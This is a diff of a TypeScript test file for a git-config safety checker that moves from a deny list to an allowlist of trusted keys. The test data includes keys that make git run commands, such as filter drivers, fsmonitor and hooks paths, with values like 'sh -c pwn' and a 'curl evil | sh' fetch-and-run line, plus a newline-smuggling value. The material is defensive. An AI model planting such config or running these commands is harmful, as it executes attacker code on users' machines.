@@ -1,99 +1,79 @@
 import { describe, expect, test } from 'vitest'
-import { assertSha, findDangerousGitConfig, GIT_HARDENING_ARGS } from '../gitSafety'
+import { assertSha, findUntrustedGitConfig, GIT_HARDENING_ARGS } from '../gitSafety'
 
 /** `git config --null --list` framing: `key\nvalue\0` per entry (`key\0` when valueless). */
 const nul = (entries: [string, string?][]): string =>
   entries.map(([k, v]) => (v === undefined ? `${k}\0` : `${k}\n${v}\0`)).join('')
 
-describe('findDangerousGitConfig', () => {
-  test('a stock `git init` config is clean', () => {
+describe('findUntrustedGitConfig (allowlist)', () => {
+  test('a stock `git init` / clone / user config is trusted', () => {
     const out = nul([
       ['core.repositoryformatversion', '0'],
       ['core.filemode', 'true'],
       ['core.bare', 'false'],
       ['core.logallrefupdates', 'true'],
+      ['core.ignorecase', 'true'],
+      ['core.precomposeunicode', 'true'],
+      ['core.symlinks', 'false'],
       ['user.name', 'A Co-author'],
+      ['user.email', 'a@b.c'],
       ['remote.origin.url', 'git@github.com:x/y.git'],
+      ['remote.origin.fetch', '+refs/heads/*:refs/remotes/origin/*'],
       ['branch.main.remote', 'origin'],
+      ['branch.main.merge', 'refs/heads/main'],
+      ['init.defaultbranch', 'main'],
+      ['pull.rebase', 'false'],
     ])
-    expect(findDangerousGitConfig(out)).toEqual([])
+    expect(findUntrustedGitConfig(out)).toEqual([])
   })
 
-  test('flags every command-executing key family', () => {
-    const out = nul([
-      ['filter.evil.clean', 'sh -c pwn'],
-      ['filter.evil.smudge', 'sh -c pwn'],
-      ['diff.tex.textconv', 'pwn'],
-      ['diff.external', 'pwn'],
-      ['diff.evil.command', 'pwn'],
-      ['merge.evil.driver', 'pwn %O %A %B'],
-      ['core.fsmonitor', '/tmp/pwn'],
-      ['core.hookspath', '.githooks'],
-      ['core.sshcommand', 'pwn'],
-      ['gpg.program', 'pwn'],
-      ['gpg.ssh.program', 'pwn'],
-      ['gpg.x509.program', 'pwn'],
-      ['core.worktree', '/Users/someone'],
-    ])
-    expect(findDangerousGitConfig(out).map((r) => r.key)).toEqual([
-      'filter.evil.clean',
-      'filter.evil.smudge',
-      'diff.tex.textconv',
-      'diff.external',
-      'diff.evil.command',
-      'merge.evil.driver',
-      'core.fsmonitor',
-      'core.hookspath',
-      'core.sshcommand',
-      'gpg.program',
-      'gpg.ssh.program',
-      'gpg.x509.program',
-      'core.worktree',
-    ])
+  test.each([
+    ['a filter driver', 'filter.evil.clean'],
+    ['a textconv', 'diff.tex.textconv'],
+    ['an external diff', 'diff.external'],
+    ['a merge driver', 'merge.evil.driver'],
+    ['an fsmonitor hook', 'core.fsmonitor'],
+    ['a hooks path', 'core.hookspath'],
+    ['an ssh command', 'core.sshcommand'],
+    ['a gpg program', 'gpg.program'],
+    ['an ssh signing key command', 'gpg.ssh.defaultkeycommand'],
+    ['commit signing', 'commit.gpgsign'],
+    ['a moved work tree', 'core.worktree'],
+    ['an include', 'include.path'],
+    ['a conditional include', 'includeif.onbranch:stanza/**.path'],
+    ['per-worktree config', 'extensions.worktreeconfig'],
+    ['submodule recursion', 'submodule.recurse'],
+    ['a remote upload-pack command', 'remote.origin.uploadpack'],
+    ['an alias', 'alias.st'],
+    ['an unknown key', 'something.new'],
+  ])('flags %s', (_label, key) => {
+    expect(findUntrustedGitConfig(nul([[key, 'x']])).map((r) => r.key)).toEqual([key])
   })
 
-  test('matches case-insensitively on section + variable names', () => {
-    const out = nul([['Core.hooksPath', 'x'], ['DIFF.External', 'y'], ['Filter.LFS.Clean', 'z']])
-    expect(findDangerousGitConfig(out).map((r) => r.key)).toEqual([
-      'Core.hooksPath',
-      'DIFF.External',
-      'Filter.LFS.Clean',
+  test('section and variable names match case-insensitively', () => {
+    expect(findUntrustedGitConfig(nul([['Core.FileMode', 'true'], ['Remote.Origin.URL', 'u']]))).toEqual([])
+    expect(findUntrustedGitConfig(nul([['Core.hooksPath', 'x']])).map((r) => r.key)).toEqual(['Core.hooksPath'])
+  })
+
+  test('a subsection cannot borrow an allowed section: only the section name counts', () => {
+    // [filter "remote.origin"] url = … is still a filter section.
+    expect(findUntrustedGitConfig(nul([['filter.remote.origin.url', 'x']])).map((r) => r.key)).toEqual([
+      'filter.remote.origin.url',
     ])
   })
 
   test('carries the value so the warning can show what would run', () => {
-    expect(findDangerousGitConfig(nul([['filter.x.clean', 'curl evil | sh']]))).toEqual([
+    expect(findUntrustedGitConfig(nul([['filter.x.clean', 'curl evil | sh']]))).toEqual([
       { key: 'filter.x.clean', value: 'curl evil | sh' },
     ])
   })
 
   test('a value containing newlines cannot smuggle a fake key past the parser', () => {
-    // With --null, a multi-line value stays inside one entry.
-    const out = nul([['user.name', 'x\nfilter.fake.clean=y']])
-    expect(findDangerousGitConfig(out)).toEqual([])
+    expect(findUntrustedGitConfig(nul([['user.name', 'x\nfilter.fake.clean=y']]))).toEqual([])
   })
 
-  test('look-alike keys that execute nothing are not flagged', () => {
-    const out = nul([
-      ['diff.tex.xfuncname', '^\\\\section'],
-      ['diff.renames', 'true'],
-      ['merge.ff', 'false'],
-      ['merge.evil.name', 'just a label'],
-      ['gpg.format', 'ssh'],
-      ['core.fsmonitorhookversion', '2'],
-      ['core.editor', 'vim'],
-    ])
-    expect(findDangerousGitConfig(out)).toEqual([])
-  })
-
-  test('a boolean core.fsmonitor (builtin daemon / off) is not a command', () => {
-    expect(findDangerousGitConfig(nul([['core.fsmonitor', 'false']]))).toEqual([])
-    expect(findDangerousGitConfig(nul([['core.fsmonitor', 'true']]))).toEqual([])
-    expect(findDangerousGitConfig(nul([['core.fsmonitor']]))).toEqual([]) // bare key = true
-  })
-
-  test('empty / unparsable output yields no risks', () => {
-    expect(findDangerousGitConfig('')).toEqual([])
+  test('empty output yields no risks', () => {
+    expect(findUntrustedGitConfig('')).toEqual([])
   })
 })
 
@@ -123,7 +103,13 @@ describe('assertSha', () => {
 })
 
 describe('GIT_HARDENING_ARGS', () => {
-  test('disables fsmonitor and hooks for every invocation', () => {
-    expect(GIT_HARDENING_ARGS).toEqual(['-c', 'core.fsmonitor=false', '-c', 'core.hooksPath=/dev/null'])
+  test('disables fsmonitor, hooks, signing and submodule recursion for every invocation', () => {
+    expect(GIT_HARDENING_ARGS).toEqual([
+      '-c', 'core.fsmonitor=false',
+      '-c', 'core.hooksPath=/dev/null',
+      '-c', 'commit.gpgSign=false',
+      '-c', 'tag.gpgSign=false',
+      '-c', 'submodule.recurse=false',
+    ])
   })
 })
